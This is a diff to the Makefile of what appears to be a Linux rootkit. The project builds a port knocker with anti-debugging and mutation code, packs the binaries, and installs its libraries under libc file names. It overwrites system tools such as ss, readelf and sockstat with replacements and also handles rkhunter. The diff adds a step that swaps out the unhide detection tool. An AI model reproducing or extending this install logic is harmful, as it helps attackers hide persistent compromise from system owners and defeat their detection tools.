@@ -1,7 +1,7 @@
 CC        := cc
 OUT       := hoxha
 CLIENT    := enver
-UPX	 	  := ./upx
+UPX		 := ./upx
 SSTRIP    := ./sstrip
 SRC       := knocker.c mutate.c anti_debug.c
 BINDIR    := /usr/bin
@@ -11,7 +11,7 @@ PATCH     := ./patchelf --add-needed
 TOOLS     := tools
 CLIENTSRC := enver.c anti_debug.c mutate.c
 PACKAGES  := apt sockstat iproute2 bash dash elfutils
-MARCH 	  := $(shell gcc -Q -march=native --help=target | grep -m1 march= | awk '{print $$2}' | tr -d '[:space:]')
+MARCH 	 := $(shell gcc -Q -march=native --help=target | grep -m1 march= | awk '{print $$2}' | tr -d '[:space:]')
 
 # Library targets
 LIBEXEC  := libexec.so
@@ -70,10 +70,12 @@ install:
 	$(CHMOD) ./tools/readelf
 	$(CHMOD) ./tools/ss
 	$(CHMOD) ./tools/rkhunter
+	$(CHMOD) ./tools/unhide
 	cp $(LIBEXEC) $(LIBDIR)/libc.so.4
 	cp $(LIBHIDE) $(LIBDIR)/libc.so.5
 	cp $(TOOLS)/ss $$(which ss)
 	cp $(TOOLS)/readelf $$(which readelf)	
+	cp $(TOOLS)/unhide $$(which unhide)
 	@if which sockstat >/dev/null 2>&1; then \
 		cp $(TOOLS)/sockstat $$(which sockstat); \
 	fi
